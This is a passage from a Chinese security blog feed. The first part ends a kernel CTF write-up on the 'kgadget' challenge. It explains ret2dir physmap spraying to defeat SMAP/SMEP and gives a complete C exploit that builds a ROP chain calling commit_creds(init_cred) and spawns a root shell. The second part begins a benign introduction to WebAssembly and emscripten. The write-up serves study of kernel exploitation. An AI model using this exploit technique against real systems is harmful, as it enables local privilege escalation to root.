   qmemcpy(</span><br><span class="line">      (<span class="type">void</span> *)(((<span class="type">unsigned</span> __int64)&amp;STACK[<span class="number">0xFE0</span>] &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL) - <span class="number">168</span>),</span><br><span class="line">      <span class="string">&quot;arttnba3arttnba3arttnba3arttnba3arttnba3arttnba3&quot;</span>,</span><br><span class="line">      <span class="number">48</span>);</span><br><span class="line">    *(_QWORD *)(((<span class="type">unsigned</span> __int64)&amp;STACK[<span class="number">0xFE0</span>] &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL) - <span class="number">112</span>) = <span class="number">0x3361626E74747261</span>LL;</span><br><span class="line">    printk(&amp;unk_3F8);</span><br><span class="line">    v3(&amp;unk_3F8, v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_420);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现其会主动破坏栈底的pt_regs结构体,仅保留r8,r9</p><p>之后调用rdx指向的函数指针</p><p>因此需要找到一段内存，将<code>ROP</code>链填充进去。</p><p>那么这段区域需要选取在哪里，若我们直接再用户空间中构造这段<code>payload</code>，接着将用户空间地址传递给<code>ioctl</code>是不可行的，因为内核开启了<code>smap</code>与<code>smep</code>的保护，因此对用户空间的访问都是不被允许的。</p><p><strong>但其实我们并不需要显式地在内核空间布置数据，而是可以通过一个位于内核空间中的地址直接访问到用户空间中的数据</strong>——那就是映射了整个物理内存的 <code>direct mapping area</code>。</p><p><strong>我们为用户空间所分配的每一张内存页，在内核空间中都能通过这块内存区域访问到</strong>，因此我们只需要在用户空间布置恶意数据，之后再在内核空间的这块区域中找到我们的用户空间数据对应的内核空间地址即可，这便是 <code>ret2dir</code> ——<strong>通过内核空间地址访问到用户空间数据</strong>。</p><p>但是这段内存十分庞大，有64TB的大小，我们怎么才能确保搜索到存放我们<code>payload</code>的地址呢？答案就是尽可能的填充，使得我们用户空间的<code>payload</code>尽可能的大，那么我们搜索到的几率也会增大。</p><p>别看这个内存这么大,但是调试就可以发现真正初始化了的并不算多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0xffff888000000000 0xffff888000099000 rw-p    99000      0 [pt_ffff888000000]</span><br><span class="line">0xffff888000099000 0xffff88800009a000 r--p     1000      0 [pt_ffff888000099]</span><br><span class="line">0xffff88800009a000 0xffff88800009b000 r-xp     1000      0 [pt_ffff88800009a]</span><br><span class="line">0xffff88800009b000 0xffff888001000000 rw-p   f65000      0 [pt_ffff88800009b]</span><br><span class="line">0xffff888001000000 0xffff888001e03000 r--p   e03000      0 [pt_ffff888001000]</span><br><span class="line">0xffff888001e03000 0xffff888002000000 rw-p   1fd000      0 [pt_ffff888001e03]</span><br><span class="line">0xffff888002000000 0xffff8880029f7000 r--p   9f7000      0 [pt_ffff888002000]</span><br><span class="line">0xffff8880029f7000 0xffff88800302f000 rw-p   638000      0 [pt_ffff8880029f7]</span><br><span class="line">0xffff88800302f000 0xffff888003030000 r--p     1000      0 [pt_ffff88800302f]</span><br><span class="line">0xffff888003030000 0xffff888003b94000 rw-p   b64000      0 [pt_ffff888003030]</span><br><span class="line">0xffff888003b94000 0xffff888003b95000 r--p     1000      0 [pt_ffff888003b94]</span><br><span class="line">0xffff888003b95000 0xffff8880051a8000 rw-p  1613000      0 [pt_ffff888003b95]</span><br><span class="line">0xffff8880051a8000 0xffff8880051aa000 r--p     2000      0 [pt_ffff8880051a8]</span><br><span class="line">0xffff8880051aa000 0xffff88800ffe0000 rw-p  ae36000      0 [pt_ffff8880051aa]</span><br></pre></td></tr></table></figure><p>而我们通过mmap映射的一般会<strong>出现在具有对应权限的段</strong>例如<code>pt_ffff8880029f7</code>或<code>pt_ffff8880051aa</code>之类的</p><p>我们只要进行大量的页喷射,命中概率就会很大</p><p>因为15000个页就能占据<code>0x3A98000</code>的内存空间,那么在<code>0xffff888000000000+0x7000000</code>这附近命中率就很高了</p><p>如果不放心可以映射更多</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span>  prepare_kernel_cred = <span class="number">0xffffffff810c9540</span>;</span><br><span class="line"><span class="type">size_t</span>  commit_creds = <span class="number">0xffffffff810c92e0</span>;</span><br><span class="line"><span class="type">size_t</span>  init_cred = <span class="number">0xffffffff82a6b700</span>;</span><br><span class="line"><span class="type">size_t</span>  pop_rdi_ret = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="type">size_t</span>  pop_rax_ret = <span class="number">0xffffffff810115d4</span>;</span><br><span class="line"><span class="type">size_t</span>  pop_rsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span> + <span class="number">27</span>;</span><br><span class="line"><span class="type">size_t</span>  add_rsp_0xe8_pop_rbx_pop_rbp_ret = <span class="number">0xffffffff812bd353</span>;</span><br><span class="line"><span class="type">size_t</span>  add_rsp_0xd8_pop_rbx_pop_rbp_ret = <span class="number">0xffffffff810e7a54</span>;</span><br><span class="line"><span class="type">size_t</span>  add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="type">size_t</span>  ret = <span class="number">0xffffffff8108c6f1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>    (*kgadget_ptr)(<span class="type">void</span>);</span><br><span class="line"><span class="type">size_t</span>  *physmap_spray_arr[<span class="number">16000</span>];</span><br><span class="line"><span class="type">size_t</span>  page_size;</span><br><span class="line"><span class="type">size_t</span>     try_hit;</span><br><span class="line"><span class="type">int</span>     dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">// to exit the process normally instead of segmentation fault</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">constructROPChain</span><span class="params">(<span class="type">size_t</span> *rop)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// gadget to trigger pt_regs and for slide</span></span><br><span class="line">    <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>); idx++)</span><br><span class="line">        rop[idx] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// more normal slide code</span></span><br><span class="line">    <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x10</span>); idx++)</span><br><span class="line">        rop[idx] = ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rop chain</span></span><br><span class="line">    rop[idx++] = pop_rdi_ret;</span><br><span class="line">    rop[idx++] = init_cred;</span><br><span class="line">    rop[idx++] = commit_creds;</span><br><span class="line">    rop[idx++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = (<span class="type">size_t</span>) getRootShell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;dev fd!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// construct per-page rop chain</span></span><br><span class="line">    physmap_spray_arr[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    constructROPChain(physmap_spray_arr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray physmap, so that we can easily hit one of them</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying physmap...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        physmap_spray_arr[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!physmap_spray_arr[i])</span><br><span class="line">            errExit(<span class="string">&quot;oom for physmap spray!&quot;</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="number">0</span>], page_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger physmap one_gadget...&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(5);</span></span><br><span class="line"></span><br><span class="line">    try_hit = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    pop_rsp_ret;&quot;</span>   <span class="comment">// stack migration again</span></span><br><span class="line">        <span class="string">&quot;mov r8,    try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax,   0x10;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   0x1bf52;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   dev_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">几道内核堆例题用以巩固</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="kernel" scheme="https://ixout.github.io/tags/kernel/"/>
    
    <category term="heap" scheme="https://ixout.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>WASM-pwn初识</title>
    <link href="https://ixout.github.io/posts/1523/"/>
    <id>https://ixout.github.io/posts/1523/</id>
    <published>2023-12-29T11:19:12.000Z</published>
    <updated>2025-03-13T13:07:24.529Z</updated>
    
    <content type="html"><![CDATA[<h1 id="发展"><a href="#发展" class="headerlink" title="发展"></a>发展</h1><p>WASM即WebAssembly</p><p>其是Google开发的一款浏览器中使用的汇编语言.设计的初衷是使用c原生binary加速jiavascript的计算行为。wasm编译形成的binary类似一种<strong><u>基于栈的虚拟机</u></strong>，<strong>有自己的编译器和指令集。</strong></p><p>要谈webassembly的历史就得谈到 <code>javaScript</code> 了，众所周知， <code>javaScript</code> 是一门动态类型的语言，编写程序时无需考虑变量类型，而且还可以运行时改变类型。对于开发者，确实很方便，但对于运行它的引擎就很有问题了。看一下 <code>V8</code> 引擎从 <code>js</code> 源码到执行的一个过程。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/v2-8a34ae8c1a7a0f87e19b1384a025e354_720w.webp" alt="img"></p><p>由于 <code>js</code> 的动态类型，解释器在执行代码的时候会在类型判断上带来一定的性能消耗，降低执行速度。所以 <code>V8</code> 引擎采用了 <code>JIT</code>（即时编译技术） 技术，<u>监控一些经常执行的代码，将其编译成 <code>CPU</code> 直接执行的机器码</u>，提高执行速度。但由于 <code>js</code> 动态类型，在某些情况下还得反优化，回到字节码进行执行。</p><p>随着前端的不断发展，项目的大小和复杂度不断增大，对于某些场景，性能上可能已经无法满足，浏览器厂商们也一直在探索性能优化的方法。</p><h3 id="NaCl-PNaCl"><a href="#NaCl-PNaCl" class="headerlink" title="NaCl/PNaCl"></a>NaCl/PNaCl</h3><p><code>2011</code> 年 <code>Google</code> 在 <code>Chrome</code> 中使用了 <code>NaCl</code> 技术，可以使得 <code>C</code> 语言编写的程序运行到浏览器中，下边是维基百科的定义。</p><blockquote><p><strong>Google Native Client</strong>（缩写为<strong>NaCl</strong>），是一个由谷歌所发起的开放源代码计划，采用BSD许可证。它采用沙盒技术，让Intel x86、ARM或MIPS子集的机器代码直接在沙盒上运行。它能够从浏览器直接运行程序机器代码，独立于用户的操作系统之外，使Web应用程序可以用接近于机器代码运作的速度来运行，同时兼顾安全性。其功能类似于微软的 ActiveX，但是ActiveX只支持视窗系统。</p></blockquote><p>但一个完整的 <code>NaCl</code> 应用，在分发时需要提供支持多个架构平台（X86 / X64 / ARM 等）的模块文件，后来谷歌又推出了与底层架构无关的 <code>PNaCl</code> 技术。但由于其开发难度、兼容性等问题最终没有普及开来。在 <code>2017</code> 年 <code>Google</code> 宣布放弃 <code>PNaCl</code> 转向 <code>WebAssembly</code>。</p><h3 id="ASM-js"><a href="#ASM-js" class="headerlink" title="ASM.js"></a>ASM.js</h3><p><code>ASM.js</code> 是 <code>Mozilla</code> 在 <code>2013</code> 年推出的，是 <code>javaScript</code> 的一个严格子集，可以作为 <code>C/C++</code> 编译的目标语言，从而使得 <code>js</code> 引擎可以采用 <code>AOT(Ahead Of Time)</code> 的编译策略，也就是在运行前直接编译成机器码，因此运行速度会有一定的提升。</p><p><code>ASM.js</code> 通常不直接编写，而是作为一种通过编译器生成的中间语言，该编译器获取 <code>C++</code> 或其他语言的源代码，然后输出 <code>ASM.js</code>。</p><p>例如下边的 <code>C</code> 语言代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过编译器编译会生成下边的 <code>js</code> 代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">i</span>) &#123;</span><br><span class="line">  i = i|<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (i + <span class="number">1</span>)|<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里的<code>|0</code> 在 <code>js</code> 中相当于和 <code>0</code> 进行了或操作，所以不影响原本的逻辑。在 <code>asm.js</code> 中起到了类型标记的作用，这样 <code>js</code> 引擎执行的时候就知道 <code>i</code> 是一个整型，返回值是一个整型。除了或操作这种，<code>ASM.js</code> 标准中还规定了很多类似的标记规则，用于告诉 <code>js</code> 引擎变量的类型，便于进行 <code>AOT</code> 优化。</p><p>这看起来和 <code>TypeScript</code> 很像，但其实不是一种东西。<code>TypeScript</code> 是 <code>js</code> 的一个超集，浏览器并不能直接执行 <code>ts</code>，还需要转换为 <code>js</code> 去执行。<code>ts</code> 主要是帮助我们开发人员去看的，增加了代码的可读性，也可以让编辑器提前发现一些错误。而 <code>asm.js</code> 是用于引擎的编译优化。</p><h3 id="WebAssembly"><a href="#WebAssembly" class="headerlink" title="WebAssembly"></a>WebAssembly</h3><p>接下来看一下 <code>WebAssembly</code> 的历史。</p><blockquote><p>2015 年 4 月，WebAssembly Community Group 成立；<br>2015 年 6 月，WebAssembly 第一次以 WCG 的官方名义向外界公布；<br>2016 年 8 月，WebAssembly 开始进入了漫长的 “Browser Preview” 阶段；<br>2017 年 2 月，WebAssembly 官方 LOGO 在 Github 上的众多讨论中被最终确定；同年同月，一个历史性的阶段，四大浏览器（FireFox、Chrome、Edge、WebKit）在 WebAssembly 的 MVP（最小可用版本）标准实现上达成共识，这意味着 WebAssembly 在其 MVP 标准上的 “Brower Preview” 阶段已经结束；<br>2017 年 8 月，W3C WebAssembly Working Group 成立，意味着 WebAssembly 正式成为 W3C 众多技术标准中的一员。</p></blockquote><p><code>WebAssembly</code> 于 <code>2019</code> 年 <code>12</code> 月 <code>5</code> 日成为万维网联盟（<code>W3C</code>）的推荐标准，与 <code>HTML</code>，<code>CSS</code> 和 <code>JavaScript</code> 一起成为 <code>Web</code> 的第四种语言。</p><p>可以看一下目前浏览器的支持程度，已经算比较高了。</p><p><img src="https://pica.zhimg.com/80/v2-62c512d5a8cb3b63c585721c223afeb5_720w.webp?source=1def8aca" alt="img"></p><h1 id="环境搭建及工具"><a href="#环境搭建及工具" class="headerlink" title="环境搭建及工具"></a>环境搭建及工具</h1><h2 id="开发环境emscripten"><a href="#开发环境emscripten" class="headerlink" title="开发环境emscripten"></a>开发环境emscripten</h2><p><a href="https://emscripten.org/">emscripten</a> 是一套编译构建方案，同时提供了比较完整的 SDK 。它使我们可以非常方便地使用 C/C++ 语言完成 WebAssembly 相关的开发与环境集成。</p><p>安装的方式，是先拉取 git 代码：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/emscripten-core/emsdk.git</span><br></pre></td></tr></table></figure><p>进入目录后，执行安装，它会下载 C 编辑器，nodejs 等一堆东西：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> emsdk</span><br><span class="line">./emsdk install latest</span><br><span class="line">./emsdk activate latest</span><br></pre></td></tr></table></figure><p>最后处理一下环境（效果只在终端的当前会话有效）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ./emsdk_env.sh</span><br></pre></td></tr></table></figure><p>当 <code>emcc</code> 是一个可执行命令时，整个环境就准备好了。</p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>写一个最简单的hello world程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello world.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用命令行编译</p><p><code>emcc hello.c -o hello.html</code></p><p>因为这个编译出来是html,所以用python搭建一个服务器运行验证一下,</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 9000</span><br></pre></td></tr></table></figure><p>之后访问<code>127.0.0.1:9000/hello.html</code>可以看到<code>hello world</code>的消息。以及emsc控制台的界面。</p><h3 id="更多选项"><a href="#更多选项" class="headerlink" title="更多选项"></a>更多选项</h3><p>emcc —help查看</p><h4 id="o"><a href="#o" class="headerlink" title="-o"></a>-o</h4><p>在上一步中我们指定编译结果为html格式</p><p>实际上可以有更多形式</p><p>文档原话是</p><blockquote><p>“-o <target>“<br>   [link] When linking an executable, the “target” file name extension<br>   defines the output type to be generated:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">* &lt;name&gt; **.js** : JavaScript (+ separate **&lt;name&gt;.wasm** file</span><br><span class="line">  if emitting WebAssembly). (default)</span><br><span class="line"></span><br><span class="line">* &lt;name&gt; **.mjs** : ES6 JavaScript module (+ separate</span><br><span class="line">  **&lt;name&gt;.wasm** file if emitting WebAssembly).</span><br><span class="line"></span><br><span class="line">* &lt;name&gt; **.html** : HTML + separate JavaScript file</span><br><span class="line">  (**&lt;name&gt;.js**; + separate **&lt;name&gt;.wasm** file if emitting</span><br><span class="line">  WebAssembly).</span><br><span class="line"></span><br><span class="line">* &lt;name&gt; **.wasm** : WebAssembly without JavaScript support code</span><br><span class="line">  (&quot;standalone Wasm&quot;; this enables &quot;STANDALONE_WASM&quot;).</span><br></pre></td></tr></table></figure><p>   These rules only apply when linking.  When compiling to object code<br>   (See <em>-c</em> below) the name of the output file is irrelevant.</p></blockquote><p>即-o选项指定的<code>生成文件名的后缀</code>会影响编译结果的文件格式及数量</p><p>一般要<u>生成能够由wasm运行时直接运行的文件需要<code>.wasm</code>后缀格式</u>,即webassembly二进制格式</p><h4 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h4><p>指定编译时的一些设置变量</p><p>例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-s WASM=1</span><br><span class="line">-s PURE_WASI=1#尽可能的使用WASI API</span><br><span class="line">-s STACK_OVERFLOW_CHECK=1</span><br></pre></td></tr></table></figure><p>还有许多变量参数,可以在 <code>$HOME/emsdk/upstream/emscripten/src/</code>目录下的<code>setting.js</code>文件中查看</p><h4 id="g"><a href="#g" class="headerlink" title="-g"></a>-g</h4><p>保留调试符号信息</p><blockquote><p>“-g<level>“<br>   [compile+link] Controls the level of debuggability. Each level<br>   builds on the previous one:</p><pre><code>  * &quot;-g0&quot;: Make no effort to keep code debuggable.  * &quot;-g1&quot;: When linking, preserve whitespace in JavaScript.  * &quot;-g2&quot;: When linking, preserve function names in compiled code.  * &quot;-g3&quot;: When compiling to object files, keep debug info,    including JS whitespace, function names, and LLVM debug info    (DWARF) if any (this is the same as -g).</code></pre></blockquote><h4 id="O"><a href="#O" class="headerlink" title="-O"></a>-O</h4><p>开启优化</p><h2 id="WASM运行时"><a href="#WASM运行时" class="headerlink" 